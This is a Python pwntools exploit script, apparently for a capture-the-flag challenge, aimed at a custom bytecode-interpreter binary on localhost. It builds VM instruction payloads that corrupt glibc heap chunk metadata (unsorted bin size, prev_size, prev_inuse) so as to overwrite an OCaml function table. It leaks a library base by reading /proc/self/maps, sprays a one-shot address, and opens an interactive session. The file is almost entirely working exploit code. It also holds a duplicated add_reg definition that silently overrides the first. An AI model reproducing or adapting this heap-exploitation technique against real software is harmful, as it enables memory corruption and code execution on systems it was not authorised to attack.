#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import struct

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './app'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def p24(val):
    return struct.pack("<I", val)[:3]

def inst(opcode, arg1, arg2):
    return p24(arg2 << 0x10 | arg1 << 0x8 | opcode)

def syscall(arg1, arg2):
    return inst(0xf, arg1, arg2)

def set_reg(reg, val):
    return inst(0, reg, val)

def get_reg(reg):
    return inst(1, reg, 0x0)

def add_reg(reg1, reg2):
    return inst(2, reg1, reg2)

# store in r0
def add_reg(reg1, reg2):
    return inst(3, reg1, reg2)

def sub_reg(reg1, reg2):
    return inst(4, reg1, reg2)

def sub_reg_store(reg1, reg2):
    return inst(5, reg1, reg2)

# addr multipled by 8
def set_mem(off, val):
    return inst(13, off, val)

def set_mem_reg(off_reg, val_reg):
    return inst(14, off_reg, val_reg)

def mul_reg(reg1, reg2):
    return inst(7, reg1, reg2)

def mov_reg(reg_dst, reg_src):
    return inst(0x10, reg_dst, reg_src)

def get_mem(off):
    return inst(11, off, 0)

# reg 0 - 3
def set_reg_big_val(reg, val, add_extra=0):
    payload = b""
    null = True
    payload += set_reg(0,0)
    for i in reversed(range(8)):
        tmp = (val >> (i*8)) & 0xff

        if tmp == 0 and null:
            continue

        if tmp != 0x0:
            print("Tmp: ", hex(tmp))
            if null:
                if tmp > 0x80:
                    payload += set_reg(1, tmp+2)
                    payload += set_reg(2, tmp//2+2)
                    payload += add_reg(0, 1)
                    payload += add_reg(0, 2)
                    payload += set_reg(2, 2 * 2 * 2 * 2)
                    payload += mul_reg(0, 2)
                else:
                    payload += set_reg(0, tmp*2+1)
                null = False
            else:
                if tmp >= 0x80:
                    payload += set_reg(1, tmp+2)
                    payload += set_reg(2, tmp//2+2)
                    payload += add_reg(0, 1)
                    payload += add_reg(0, 2)

                    payload += set_reg(2, 2 * 2 * 2 * 2)

                    payload += mul_reg(0, 2)
                else:
                    payload += set_reg(1, tmp*2+2)

                    payload += add_reg(0, 1)
                    # *2 for the actuall mul by 2
                    payload += set_reg(2, 2 * 2 * 2)

                    payload += mul_reg(0, 2)

        if i == 0:
            break

        payload += set_reg(1, 0x40 * 2)
        payload += set_reg(2,  8 * 2 * 2)
        payload += mul_reg(0, 1)
        payload += mul_reg(0, 2)

    payload += set_reg(0x1, 0x2 * 2 * 2*2)
    payload += set_reg(0x2, 0x4 + add_extra)
    payload += mul_reg(0, 0x1)
    payload += add_reg(0, 2)
    payload += mov_reg(reg, 0)

    return payload

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
break main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# first byte is opcode, second and third are args

'''
0x958//4 = 0x256 = offset unsorted bin size
new bin size = 0x2cc1
0x2cc0 // 4 = 0xb30 = offset of prev_size
0x2cc8 // 4 = 0xb32 = offset to prev_inuse (0x0000000000010061)

modify unsorted bin size and make a large alloc to overwrite ocaml function table

currently i need mem_set at 0x19b40 = 0x2010
and mem_set at 0x19b48 = 0x20 /0x30 /0x40 /.
'''

# results stored in x0

io = start(argv, env=env)

'''
with open("set_mem_crash", "rb") as f:
    data = f.read()
'''

# every time we read reg it gets reduced by two

# get leak
payload = b""
payload += p24(0x5)
payload += syscall(0, 0)

# corrupt unsorted bin chunk size
payload += set_reg_big_val(0x4, 0x256 // 2 + 2)
payload += set_reg_big_val(0x5, 0x2cc1, 4)
payload += set_mem_reg(4, 5)

# set prev_size
payload += set_reg_big_val(0x4, 0xd84 // 2, 24)
payload += set_reg_big_val(0x5, 0x2cc1, 4)
payload += set_mem_reg(4, 5)

# corrupt prev_inuse to be 0
payload += set_reg_big_val(0x4, 0xd86 // 2, 32)
payload += set_reg_big_val(5,0x10060, 4)
payload += set_mem_reg(4, 5)

payload += p24(0x5)
payload += syscall(0, 0)

io.sendafter("Please enter the byte sequence", payload)
io.sendlineafter("name:", "/proc/self/maps")
io.recvuntil(b"libstorage.so\n")
leak = int(io.recvuntil(b"-")[:-1], 16) - 0x6000
log.info("LIB STORAGE: " + hex(leak))

log.info(f"Break at: {hex(leak + 0x91ed)}")

#one-shot
payload = p64(leak +0x9fa0) * (0x2000 // 8)
io.sendlineafter("name:",payload)

io.interactive()
